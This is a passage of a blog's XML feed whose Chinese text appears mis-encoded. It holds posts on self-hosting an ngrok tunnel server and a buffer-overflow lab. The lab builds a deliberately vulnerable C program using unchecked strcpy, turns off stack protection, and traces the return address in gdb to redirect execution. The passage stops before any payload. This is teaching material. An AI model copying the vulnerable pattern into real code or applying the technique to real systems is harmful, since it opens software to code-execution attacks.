å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼‚å‘³çš„æœ‰80æ¡è¯„è®ºï¼Œæ‰€ä»¥çœŸæ­£è¯„è®ºæœ‰å¼‚å‘³çš„è¯„è®ºæ¡æ•°ä¸º 85-80=5 çœ‹ä¸€ä¸ªå•†å“çš„ç”¨æˆ·è¯„ä»·çš„æ—¶å€™ï¼Œè¿‡å¤šçš„å…³æ³¨æ­£é¢è¯„ä»·ä¸€èˆ¬æ²¡æœ‰å¤šå¤§æ„ä¹‰ï¼Œæœ‰å¯èƒ½å¾ˆå¤šæ˜¯åˆ·çš„è™šå‡ä¿¡æ¯ï¼Œä½†æ˜¯è´Ÿé¢è¯„ä»·ä¸€èˆ¬æ˜¯çœŸå®žçš„ç”¨æˆ·è¯„è®ºï¼ŒæŽ’é™¤ç«žäº‰å¯¹æ‰‹çš„æ¶æ„è¯„è®ºï¼ŒåŸºæœ¬ä¸Šåªæœ‰ç”¨æˆ·åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œå¾ˆç”Ÿæ°”çš„æƒ…å†µä¸‹æ‰ä¼šç‰¹æ„æ¥å¯¹å•†å“è¿›è¡Œè´Ÿé¢çš„è¯„è®ºï¼Œæ‰€ä»¥å½“å–œæ¬¢ä¸€ä¸ªå•†å“è¦è´­ä¹°æ—¶ï¼Œå°±å°½å¯èƒ½å¤šçš„åœ¨è´Ÿé¢è¯„è®ºä¸­å‚è€ƒï¼Œçœ‹çœ‹è‡ªå·±å¯¹è¿™ä¸ªä¸œè¥¿çš„å–œæ¬¢æ˜¯å¦æ‰“è¿‡ä»–çš„ç¼ºç‚¹ã€‚ ç»è¿‡ç»Ÿè®¡ï¼Œåœ¨122650æ¡è¯„è®ºä¸­åªæœ‰5ä¸ªäººè¯´æ¯å­æœ‰å¼‚å‘³ï¼Œæ‰€ä»¥ä¸‰ä¸ªå­— ä¹°ä¹°ä¹°ï¼]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­å»ºngrokæœåŠ¡å™¨]]></title>
    <url>%2F38f11925%2F</url>
    <content type="text"><![CDATA[åœ¨å¼€å‘çš„æ—¶å€™éš¾å…ä¼šé‡åˆ°ä¸€äº›ç‰¹æ®Šåœºæ™¯ï¼Œæ¯”å¦‚éœ€è¦åœ¨æµ‹è¯•æœåŠ¡å™¨ä¸Šè¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬å°†å·¥ç¨‹ä½¿ç”¨Debugæ¨¡å¼éƒ¨ç½²åœ¨æµ‹è¯•æœåŠ¡å™¨ä¸Šï¼Œç„¶åŽæœ¬åœ°å¯ä»¥è¿›è¡Œè¿œç¨‹æ–­ç‚¹è°ƒè¯•ã€‚ä½†æ˜¯è¿™æ ·åšè¿˜æ˜¯ä¸å¤Ÿæ–¹ä¾¿ï¼Œæ¯”å¦‚å¼€å‘è€…æœ¬åœ°æ–°å¢žæˆ–è€…ä¿®æ”¹äº†ä»£ç ï¼Œå°±æ²¡æ³•å®žæ—¶è¿›è¡Œè¿œç¨‹æ–­ç‚¹è°ƒè¯•äº†ã€‚ç›®å‰æœ€ä¼˜è§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠå¼€å‘è€…è‡ªå·±çš„ç”µè„‘å½“åšæµ‹è¯•æœåŠ¡å™¨ï¼Œæ­å»ºä¸€ä¸ªå±žäºŽè‡ªå·±çš„ngrokæœåŠ¡å™¨ï¼Œå®žçŽ°å†…ç½‘ç©¿é€ï¼Œå¤–ç½‘é€šè¿‡ç»‘å®šçš„åŸŸåè¿›è¡Œè®¿é—®ï¼Œå¼€å‘è€…å°±å¯ä»¥ç›´æŽ¥åœ¨æœ¬åœ°è¿›è¡Œå¾®ä¿¡å¼€å‘ã€‚ å¾ˆæ—©ä¹‹å‰åœ¨åšå¾®ä¿¡å¼€å‘çš„æ—¶å€™ï¼Œæˆ‘å°±å·²ç»åœ¨è‡ªå·±çš„LinuxæœåŠ¡å™¨ä¸Šæ­å»ºå¥½äº†ngrokï¼Œç”±äºŽæˆ‘è‡ªå·±ä½¿ç”¨çš„æ˜¯è‹¹æžœç¬”è®°æœ¬ï¼Œæ‰€ä»¥ngrokç¼–è¯‘çš„ç‰ˆæœ¬ä¹Ÿæ˜¯é’ˆå¯¹MacOSç³»ç»Ÿçš„ï¼Œä»¥å‰ä»¥ä¸ºä¸ä¼šç”¨åˆ°Windowsç³»ç»Ÿï¼Œå°±æ²¡æœ‰ç¼–è¯‘ï¼Œç»“æžœåœ¨å·¥ä½œä¸­ä½¿ç”¨çš„æ˜¯Windowsç³»ç»Ÿã€‚ç”±äºŽä¹ æƒ¯äº†MacOSçš„å¼€å‘çŽ¯å¢ƒå’Œå¼ºå¤§çš„è§¦æŽ§æ¿ï¼Œåœ¨Windowsä¸Šçš„æˆ‘å„ç§ä¸é€‚åº”ã€‚åŽŸæœ¬å‡ åˆ†é’Ÿæžå®šçš„äº‹æžäº†å¤§åŠå¤©ã€‚ ä¸ºäº†åŽç»­å¼€å‘æ–¹ä¾¿ï¼ŒæŽ¥ä¸‹æ¥æˆ‘é€šè¿‡ç¼–è¯‘ngrokæºç ç”ŸæˆWindowsç‰ˆæœ¬çš„å¯æ‰§è¡Œç¨‹åºã€‚ å‡†å¤‡å·¥ä½œ Git GoLang ä¸€å°æ‹¥æœ‰å…¬ç½‘ipçš„æœåŠ¡å™¨ ä¸€ä¸ªç»‘å®šåˆ°å…¬ç½‘ipæœåŠ¡å™¨ä¸Šçš„åŸŸå Gitå’ŒGolangçš„ä¸‹è½½å’Œå®‰è£…å¾ˆç®€å•ï¼Œä¸å†é˜è¿°ã€‚è¿™é‡Œé¡ºä¾¿å†å®‰åˆ©ä¸€æ³¢GoLangï¼Œä¹‹å‰å­¦è¿‡goï¼Œæ„Ÿè§‰åœ¨æºç¨‹æ–¹é¢ç¡®å®žå¾ˆå¼ºå¤§ã€‚è¿è¡Œæ•ˆçŽ‡å¯ä»¥å’ŒCè¯­è¨€åª²ç¾Žï¼Œå¾ˆé€‚åˆç³»ç»Ÿç¼–ç¨‹ï¼ˆç›®å‰å¾ˆç«çš„åŒºå—é“¾å¤§å¤šæ•°ç”¨goå†™ï¼‰ï¼Œå¼€å‘æ•ˆçŽ‡ä¹Ÿå¾ˆå¿«ã€‚è¿˜æœ‰çœŸæ­£çš„è·¨å¹³å°ï¼Œè¿™é‡Œä»Žç¼–è¯‘ngrokæºç å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œgoå†™çš„ç¨‹åºå¯ä»¥ç¼–è¯‘æˆç›®å‰ä¸»æµå¹³å°çš„å¯æ‰§è¡Œç¨‹åºã€‚ å¥½äº†ï¼ŒæŽ¥ä¸‹æ¥æ­¥å…¥æ­£é¢˜ã€‚ æ­¥éª¤ ä¸‹è½½ngrokæºç  1git clone https://github.com/inconshreveable/ngrok.git ç”Ÿæˆè¯ä¹¦ (ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤) 1234567export NGROK_DOMAIN="mac.lanshiqin.com"cd ngrokopenssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj "/CN=$NGROK_DOMAIN" -days 5000 -out rootCA.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj "/CN=$NGROK_DOMAIN" -out server.csropenssl x509 -req -in server.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out server.crt -days 5000 ä¸Šé¢ NGROK_DOMAINçš„ å€¼ä¸ºè‡ªå·±çš„åŸŸå å°†ç”Ÿæˆçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¯ä¹¦æ‹·è´åˆ°å¯¹åº”èµ„æºç›®å½•ä¸‹ï¼ˆè¿™ä¸€æ­¥å¾ˆé‡è¦ï¼‰123cp rootCA.pem assets/client/tls/ngrokroot.crt cp server.crt assets/server/tls/snakeoil.crt cp server.key assets/server/tls/snakeoil.key ç¼–è¯‘ngrokæœåŠ¡ç«¯ï¼ˆæˆ‘çš„æœåŠ¡å™¨æ˜¯linuxç³»ç»Ÿï¼Œæ‰€ä»¥è¿™é‡ŒæŒ‡å®šç¼–è¯‘æˆlinuxå¹³å°çš„å¯æ‰§è¡Œç¨‹åºï¼‰ 1234#32ä½Linuxç³»ç»ŸGOOS=linux GOARCH=386 make release-server#64ä½Linuxç³»ç»ŸGOOS=linux GOARCH=amd64 make release-server ç¼–è¯‘ngrokå®¢æˆ·ç«¯Macç‰ˆæœ¬ 1GOOS=darwin GOARCH=amd64 make release-client Windowsç‰ˆæœ¬1GOOS=windows GOARCH=amd64 make release-client ç¼–è¯‘ä¹‹åŽï¼Œåœ¨ngrokæºç çš„binç›®å½•ä¸‹ç”Ÿæˆäº†å¯¹åº”ä¸åŒå¹³å°çš„ngrokå¯æ‰§è¡Œç¨‹åº ä¸ºäº†å¯åŠ¨æ–¹ä¾¿ï¼Œæ–°å»ºä¸€ä¸ªngrok.cfgé…ç½®æ–‡ä»¶12server_addr: &quot;mac.lanshiqin.com:4443&quot;trust_host_root_certs: false ä¸ºWindowså¹³å°æ–°å»ºä¸€ä¸ªstartup.batæ–‡ä»¶123@echo oncd %cd%ngrok -config=ngrok.cfg -log=ngrok.log -subdomain=mac 9000 ngrokæœåŠ¡ç«¯å¯åŠ¨1./ngrokd -domain="lanshiqin.com" -httpAddr=":80" &amp; å¯åŠ¨MacOSä¸Šçš„ngrokå®¢æˆ·ç«¯(æœ€åŽçš„ç«¯å£å·ä¸ºæœ¬åœ°ç«¯å£å·ï¼Œå¯ä»¥æŒ‡å®šä¸ºå…¶ä»–ä»»æ„ç«¯å£)1./ngrok -config=./ngrok.cfg -subdomain=mac 9000 å‘çŽ°æˆåŠŸè¿žæŽ¥ä¸ŠngrokæœåŠ¡å™¨ï¼Œè¿™æ—¶å¤–ç½‘å°±å¯ä»¥é€šè¿‡è®¿é—®åŸŸå http://mac.lanshiqin.com æ¥è®¿é—®æœ¬æœºäº† å‘çŽ°æˆåŠŸè¿žæŽ¥ä¸ŠngrokæœåŠ¡å™¨ã€‚æˆ‘ä»¬æœ¬æœº9000ç«¯å£è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œé€šè¿‡ http://mac.lanshiqin.com åŸŸåè®¿é—®æ¥éªŒè¯ä¸€ä¸‹ngrokæœåŠ¡æ˜¯å¦å¯ç”¨ å‘çŽ°å¤–ç½‘å¯ä»¥é€šè¿‡åŸŸåè®¿é—®åˆ°æœ¬æœºå¯¹åº”ç«¯å£ä¸Šçš„æœåŠ¡ï¼Œåˆ°æ­¤ç§äººngrokæœåŠ¡æ­å»ºå®Œæ¯•ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å®žéªŒ]]></title>
    <url>%2Fe2f22ec7%2F</url>
    <content type="text"><![CDATA[ç¼“å†²åŒºæº¢å‡ºæ˜¯æŒ‡å‘ç¨‹åºç¼“å†²åŒºå†™å…¥è¶…å‡ºé¢„åˆ†é…å›ºå®šé•¿åº¦æ•°æ®çš„æƒ…å†µã€‚è¿™ä¸€æ¼æ´žå¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æ”¹å˜ç¨‹åºçš„æµç¨‹æŽ§åˆ¶ï¼Œç”šè‡³æ‰§è¡Œä»£ç çš„ä»»æ„ç‰‡æ®µã€‚ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æˆä¸ºè¿œç¨‹æ”»å‡»çš„ä¸»è¦æ‰‹æ®µï¼Œæ”»å‡»è€…åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´žå¯ä»¥æ¤å…¥å¹¶ä¸”æ‰§è¡Œä»»æ„çš„æ”»å‡»ä»£ç ï¼Œç¼“å†²åŒºæº¢å‡ºæ¼æ´žç»™äºˆäº†æ”»å‡»è€…æƒ³è¦çš„ä¸€åˆ‡ï¼Œç”šè‡³å¾—åˆ°è¢«æ”»å‡»è®¡ç®—æœºçš„æŽ§åˆ¶æƒã€‚ ç¼“å†²åŒºæº¢å‡ºæ¼æ´žèƒ½å¤Ÿè¢«åˆ©ç”¨çš„ä¸»è¦åŽŸå› æ˜¯è®¡ç®—æœºé‡‡ç”¨äº†â€œå†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æž„â€ï¼Œè¯¥ä½“ç³»ç»“æž„æŠŠç¨‹åºæŒ‡ä»¤ä¹Ÿå½“åšæ•°æ®æ¥å¯¹å¾…ï¼ŒæŒ‡ä»¤å’Œæ•°æ®ä¸åŠ åŒºåˆ†æ··åˆå­˜å‚¨åœ¨åŒä¸€ä¸ªå­˜å‚¨å™¨ä¸­ï¼Œæ•°æ®å’Œç¨‹åºåœ¨å†…å­˜ä¸­æ˜¯æ²¡æœ‰åŒºåˆ«çš„,å®ƒä»¬éƒ½æ˜¯å†…å­˜ä¸­çš„æ•°æ®,å½“EIPæŒ‡é’ˆæŒ‡å‘å“ª CPUå°±åŠ è½½é‚£æ®µå†…å­˜ä¸­çš„æ•°æ®ã€‚è¿™å°±é€ æˆæ•°æ®å­˜åœ¨è¦†ç›–æŒ‡ä»¤çš„æƒ…å†µï¼Œå¦‚æžœæ•°æ®æŒ‡å‘ä¸€ä¸ªå†…å­˜åœ°å€å¹¶ä¸”è¦†ç›–äº†EIPæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šè·³è½¬åˆ°æ”»å‡»è€…æŒ‡å®šçš„ä»£ç æ®µæ‰§è¡Œã€‚ æ¦‚å¿µéƒ¨åˆ†ï¼šè®¡ç®—æœºç¨‹åºè¢«CPUæ‰§è¡Œå‰éœ€è¦å…ˆè¢«è½½å…¥å†…å­˜ï¼Œç¨‹åºæ‰€åœ¨çš„å†…å­˜ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œåˆ†é…ï¼Œç¨‹åºå†…éƒ¨ä½¿ç”¨çš„å˜é‡æˆ–è€…æŽ¥æ”¶ç”¨æˆ·è¾“å…¥çš„æ•°æ®éƒ½éœ€è¦åˆ†é…å†…å­˜ï¼Œè¿™å—å†…å­˜åŒºåŸŸä¹Ÿå«åšç¼“å†²åŒºï¼Œç¨‹åºè¢«è½½å…¥åˆ°å†…å­˜åŽçš„ç»“æž„å¦‚ä¸‹å›¾ç»¿è‰²åŒºåŸŸæ‰€ç¤ºï¼šä¸€ä¸ªç¨‹åºå ç”¨ç€ä¸€å—å†…å­˜åŒºåŸŸï¼Œè¿™å—åŒºåŸŸåŒ…å«äº†ç¨‹åºå‡½æ•°çš„è°ƒç”¨æ ˆï¼Œæ•°æ®ï¼Œç¼“å†²åŒºç­‰ã€‚å¦‚æžœå‘ç¼“å†²åŒºå†™å…¥è¶…å‡ºé•¿åº¦çš„æ•°æ®ï¼Œé‚£ä¹ˆæ•°æ®å°†ä¼šè¦†ç›–åˆ°ç¨‹åºçš„å…¶ä»–å†…å­˜åŒºåŸŸï¼Œå¦‚æžœå‡½æ•°è°ƒç”¨æ ˆé‡ŒæŸä¸ªå‡½æ•°åœ°å€è¢«è¦†ç›–æˆå…¶ä»–å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªç¨‹åºæ‰§è¡Œæµç¨‹å°†ä¼šè¢«æ”¹å˜ï¼Œå°†ä¼šæ‰§è¡Œè¦†ç›–æ•°æ®æŒ‡å®šåœ°å€çš„å‡½æ•°ã€‚æ›´ä¸ºä¸¥é‡çš„æ˜¯å¦‚æžœè¢«æ¤å…¥ç²¾å¿ƒæž„é€ çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œï¼Œæ”»å‡»è€…å°†ä¼šå¾—åˆ°è¿è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·æƒé™ï¼Œå¦‚æžœè¯¥ç¨‹åºä»¥rootè§’è‰²æ‰§è¡Œï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥å¾—åˆ°ç›®æ ‡è®¡ç®—æœºçš„å®Œå…¨æŽ§åˆ¶æƒã€‚ è¦åšçš„äº‹ï¼š ç”¨Cè¯­è¨€ç¼–å†™ä¸€ä¸ªå…·æœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´žçš„ç¨‹åºï¼Œç¨‹åºçš„åŠŸèƒ½æ˜¯ä»Žmainå‡½æ•°å‚æ•°æŽ¥æ”¶ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œå¹¶ä¸”è¾“å‡ºåˆ°æŽ§åˆ¶å°ã€‚ ä½¿ç”¨gccå°†æºä»£ç ç¼–è¯‘æˆ32ä½çš„å¯æ‰§è¡Œç¨‹åºï¼Œå¹¶ä½¿ç”¨gdbè°ƒè¯•å¹¶æ–­ç‚¹åˆ†æžç¨‹åºè¿è¡Œã€‚ è¿è¡Œç¨‹åºå¹¶å‘ç¨‹åºè¾“å…¥è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„æ•°æ®ï¼Œå¯¹ç¬¬äºŒæ­¥è°ƒè¯•åˆ†æžå¾—åˆ°çš„ç›®æ ‡å‡½æ•°åœ°å€è¿›è¡Œè¦†ç›–ï¼Œå°†å‡½æ•°åœ°å€è¦†ç›–æˆå¦ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡Œå…¶ä»–å‡½æ•°ã€‚ ä½¿ç”¨çš„ç³»ç»Ÿå’Œå·¥å…·ï¼š Ubuntu Linux 16.04ï¼ˆ64ä½ï¼‰æ“ä½œç³»ç»Ÿ vim,gcc,gdb,gcc-multilib(32ä½ç¨‹åºæ‰€éœ€çš„ç¼–è¯‘å·¥å…·)å…¶ä¸­gccå’Œgdbåœ¨Ubuntuä¸­å·²ç»å†…ç½®ï¼Œvimå’Œç¼–è¯‘32ä½ç¨‹åºæ‰€éœ€çš„gccç¼–è¯‘å™¨éœ€è¦å¦å¤–å®‰è£…12sudo apt-get install vimsudo apt-get install gcc-multilib å®žéªŒéƒ¨åˆ†ï¼šä½¿ç”¨vimæ–°å»ºä¸€ä¸ªmain.c æºä»£ç æ–‡ä»¶12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;void hello()&#123; printf("hello\n");&#125;int fun(char *str)&#123; char buf[10]; strcpy(buf, str); printf("%s\n", buf); return 0;&#125;int main(int argc, char **argv)&#123; char *str = argv[1]; fun(str); return 0;&#125; ä¸Šé¢çš„ä»£ç é€šè¿‡main()å‡½æ•°å‚æ•°æŽ¥æ”¶ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œå¹¶è°ƒç”¨fun()å‡½æ•°å°†è¾“å…¥çš„æ•°æ®stræ‹·è´ç»™bufç¼“å†²åŒºï¼Œæœ€åŽå°†bufç¼“å†²åŒºçš„å­—ç¬¦è¾“å‡ºã€‚å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä»£ç å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ä¸º10ä¸ªå­—èŠ‚å¤§å°çš„bufç¼“å†²åŒºï¼Œå¹¶ä½¿ç”¨strcpyå°†stræ•°æ®ç›´æŽ¥æ‹·è´åˆ°bufç¼“å†²åŒºï¼Œå¹¶æ²¡æœ‰å¯¹æ•°æ®é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœç”¨æˆ·è¾“å…¥äº†è¶…è¿‡10ä¸ªå­—ç¬¦çš„æ•°æ®ï¼Œé‚£ä¹ˆå°†ä¼šäº§ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‚ ä¸Šé¢çš„ä»£ç å¹¶æ²¡æœ‰è°ƒç”¨å‡½æ•°hello(),æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¼“å†²åŒºæ¼æ´žï¼Œè®©ç¨‹åºè°ƒç”¨å‡½æ•°hello()ã€‚ä½¿ç”¨gccå°†æºä»£ç ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åº1gcc -m32 -z execstack -fno-stack-protector -g -o main main.c ä¸ºäº†æ–¹ä¾¿å®žéªŒè¿›è¡Œï¼Œä¸Šé¢çš„gccç¼–è¯‘æŒ‡ä»¤åŽé¢è·Ÿäº†ä¸€äº›ç¼–è¯‘å‚æ•°ï¼š -m32 å°†ç¨‹åºç¼–è¯‘æˆ32ä½ç¨‹åº -z execstack å…è®¸æ ˆæ‰§è¡Œ -fno-stack-protector å…³é—­gccçš„Stack Guard -g ä¸ºäº†gdbç¨‹åºèƒ½å¤Ÿè°ƒè¯•ç¨‹åºï¼ˆæ–¹ä¾¿åŽç»­çš„ç»“åˆæºä»£ç æ–­ç‚¹è°ƒè¯•ï¼‰ -o è¾“å‡ºç›®æ ‡æ–‡ä»¶ä¸ºæŒ‡å®šæ–‡ä»¶ ç¼–è¯‘åŽå¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†å¯æ‰§è¡Œç¨‹åº main, è¾“å…¥å‘½ä»¤è¿è¡Œç¨‹åº å¹¶ä¸”åŽé¢è·Ÿä¸Šå‚æ•°AAAA1./main AAAA å¯ä»¥çœ‹åˆ°æŽ§åˆ¶å°æˆåŠŸè¾“å‡ºäº†è¾“å…¥çš„AAAA å¦‚æžœç”¨æˆ·è¾“å…¥è¶…è¿‡é•¿åº¦çš„å­—ç¬¦ï¼Œå‘çŽ°ç¨‹åºæ‰§è¡ŒåŽä¼šæŠ¥æ®µé”™è¯¯ æŽ¥ä¸‹æ¥ä½¿ç”¨gdbè°ƒè¯•ç›®æ ‡ç¨‹åº1gdb ./main åœ¨gdbæ¨¡å¼ä¸‹,å¯ä»¥ä½¿ç”¨disasså‘½ä»¤æŸ¥çœ‹ç¨‹åºä¸­å„ä¸ªå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¾æ¬¡æŸ¥çœ‹ç¨‹åºä¸­çš„ hello()å‡½æ•° fun()å‡½æ•° main()å‡½æ•°çš„æ±‡ç¼–ä»£ç  æ±‡ç¼–ä»£ç å¦‚ä¸‹æ‰€ç¤º:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657(gdb) disass helloDump of assembler code for function hello: 0x0804843b &lt;+0&gt;: push %ebp 0x0804843c &lt;+1&gt;: mov %esp,%ebp 0x0804843e &lt;+3&gt;: sub $0x8,%esp 0x08048441 &lt;+6&gt;: sub $0xc,%esp 0x08048444 &lt;+9&gt;: push $0x8048540 0x08048449 &lt;+14&gt;: call 0x8048310 &lt;puts@plt&gt; 0x0804844e &lt;+19&gt;: add $0x10,%esp 0x08048451 &lt;+22&gt;: nop 0x08048452 &lt;+23&gt;: leave 0x08048453 &lt;+24&gt;: ret End of assembler dump.(gdb) disass funDump of assembler code for function fun: 0x08048454 &lt;+0&gt;: push %ebp 0x08048455 &lt;+1&gt;: mov %esp,%ebp 0x08048457 &lt;+3&gt;: sub $0x18,%esp 0x0804845a &lt;+6&gt;: sub $0x8,%esp 0x0804845d &lt;+9&gt;: pushl 0x8(%ebp) 0x08048460 &lt;+12&gt;: lea -0x12(%ebp),%eax 0x08048463 &lt;+15&gt;: push %eax 0x08048464 &lt;+16&gt;: call 0x8048300 &lt;strcpy@plt&gt; 0x08048469 &lt;+21&gt;: add $0x10,%esp 0x0804846c &lt;+24&gt;: sub $0xc,%esp 0x0804846f &lt;+27&gt;: lea -0x12(%ebp),%eax 0x08048472 &lt;+30&gt;: push %eax 0x08048473 &lt;+31&gt;: call 0x8048310 &lt;puts@plt&gt; 0x08048478 &lt;+36&gt;: add $0x10,%esp 0x0804847b &lt;+39&gt;: mov $0x0,%eax 0x08048480 &lt;+44&gt;: leave 0x08048481 &lt;+45&gt;: ret End of assembler dump.(gdb) disass mainDump of assembler code for function main: 0x08048482 &lt;+0&gt;: lea 0x4(%esp),%ecx 0x08048486 &lt;+4&gt;: and $0xfffffff0,%esp 0x08048489 &lt;+7&gt;: pushl -0x4(%ecx) 0x0804848c &lt;+10&gt;: push %ebp 0x0804848d &lt;+11&gt;: mov %esp,%ebp 0x0804848f &lt;+13&gt;: push %ecx 0x08048490 &lt;+14&gt;: sub $0x14,%esp 0x08048493 &lt;+17&gt;: mov %ecx,%eax 0x08048495 &lt;+19&gt;: mov 0x4(%eax),%eax 0x08048498 &lt;+22&gt;: mov 0x4(%eax),%eax 0x0804849b &lt;+25&gt;: mov %eax,-0xc(%ebp) 0x0804849e &lt;+28&gt;: sub $0xc,%esp 0x080484a1 &lt;+31&gt;: pushl -0xc(%ebp) 0x080484a4 &lt;+34&gt;: call 0x8048454 &lt;fun&gt; 0x080484a9 &lt;+39&gt;: add $0x10,%esp 0x080484ac &lt;+42&gt;: mov $0x0,%eax 0x080484b1 &lt;+47&gt;: mov -0x4(%ebp),%ecx 0x080484b4 &lt;+50&gt;: leave 0x080484b5 &lt;+51&gt;: lea -0x4(%ecx),%esp 0x080484b8 &lt;+54&gt;: ret End of assembler dump.(gdb) å¯ä»¥çœ‹åˆ°å…¶ä¸­helloå‡½æ•°çš„é¦–åœ°å€æ˜¯ 0x0804843bï¼Œç¼“å†²åŒºæº¢å‡ºçš„æ—¶å€™ä¼šç”¨åˆ°0x0804843bã€‚é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥çœ‹åˆ°mainå‡½æ•°è°ƒç”¨funå‡½æ•°callçš„åœ°å€æ˜¯0x080484a4,callåŽçš„ä¸‹é¢ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯0x080484a9ï¼Œè¿™äº›æŒ‡ä»¤åœ°å€éƒ½å°†ä¼šæ”¾åœ¨CPUå¯„å­˜å™¨é‡Œï¼Œå¾…ä¼šæ–­ç‚¹è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ã€‚ è¾“å…¥lå‘½ä»¤åˆ—å‡ºç¨‹åºæºç ï¼š123456789101112131415161718192021(gdb) l5 &#123;6 printf("hello\n");7 &#125;8 9 int fun(char *str)10 &#123;11 char buf[10];12 strcpy(buf, str);13 printf("%s\n", buf);14 return 0;(gdb) 15 &#125;16 17 int main(int argc, char **argv)18 &#123;19 char *str = argv[1];20 fun(str);21 return 0;22 &#125;(gdb) ä½¿ç”¨ bå‘½ä»¤è¿›è¡Œæ–­ç‚¹ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹è®¾ç½®åœ¨13è¡Œå’Œ20è¡Œï¼Œçœ‹çœ‹è°ƒç”¨funå‡½æ•°æ—¶å’Œprintfè¾“å‡ºæ—¶å¯„å­˜å™¨å†…çš„æ•°æ®ã€‚12345(gdb) b 13Breakpoint 1 at 0x804846c: file main.c, line 13.(gdb) b 20Breakpoint 2 at 0x804849e: file main.c, line 20.(gdb) è¾“å…¥æ•°æ®AAAAè¿è¡Œï¼ŒæŸ¥çœ‹å¯„å­˜å™¨ebpå’Œespçš„æ•°æ®:1234567891011(gdb) r AAAAStarting program: /home/lanshiqin/æ¡Œé¢/main AAAABreakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) x/x $ebp0xffffcfd8: 0x00000000(gdb) x/8x $esp0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd2890xffffcfd0: 0xf7fb83dc 0xffffcff0 0x00000000 0xf7e20637(gdb) å¯ä»¥çœ‹åˆ°ç¨‹åºå…ˆæ‰§è¡Œåˆ°äº†funå‡½æ•°æ‰€åœ¨çš„æ–­ç‚¹ä½ç½®ï¼Œæ­¤æ—¶funå‡½æ•°æŽ¥æ”¶çš„å‚æ•°stråº”è¯¥æ˜¯è¾“å…¥çš„æ•°æ®AAAAä½¿ç”¨på‘½ä»¤æŸ¥çœ‹strçš„åœ°å€123(gdb) p str$1 = 0xffffd289 "AAAA"(gdb) ä½¿ç”¨siå‘½ä»¤å•æ­¥è¿è¡Œï¼Œç„¶åŽæŸ¥çœ‹å¯„å­˜å™¨æ•°æ®1234567891011(gdb) si0x080484a1 20 fun(str);(gdb) x/8x $esp0xffffcfb4: 0x00000001 0xf7e36830 0x0804850b 0x000000020xffffcfc4: 0xffffd084 0xffffd090 0xffffd289 0xf7fb83dc(gdb) si0x080484a4 20 fun(str);(gdb) x/8x $esp0xffffcfb0: 0xffffd289 0x00000001 0xf7e36830 0x0804850b0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd289(gdb) å¯ä»¥çœ‹åˆ°stråœ°å€`0xffffd289â€™å·²ç»åŽ‹å…¥æ ˆä¸­ç»§ç»­siå•æ­¥è¿è¡Œï¼ŒæŸ¥çœ‹å¯„å­˜å™¨æ•°æ® 1234567(gdb) sifun (str=0xffffd289 "AAAA") at main.c:1010 &#123;(gdb) x/8x $esp0xffffcfac: 0x080484a9 0xffffd289 0x00000001 0xf7e368300xffffcfbc: 0x0804850b 0x00000002 0xffffd084 0xffffd090(gdb) å¯ä»¥çœ‹åˆ°callåŽé¢çš„ä¸€æ¡æŒ‡ä»¤åœ°å€0x080484a9ä¹Ÿå·²ç»åŽ‹å…¥æ ˆä¸­ä½¿ç”¨nå•æ­¥è¿è¡Œï¼Œåˆ°è¾¾13è¡Œæ–­ç‚¹ä½ç½®ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨å†…å®¹12345678910(gdb) n12 strcpy(buf, str);(gdb) nBreakpoint 1, fun (str=0xffffd289 "AAAA") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0xf7004141 0xf7fd41a80xffffcfa0: 0x00008000 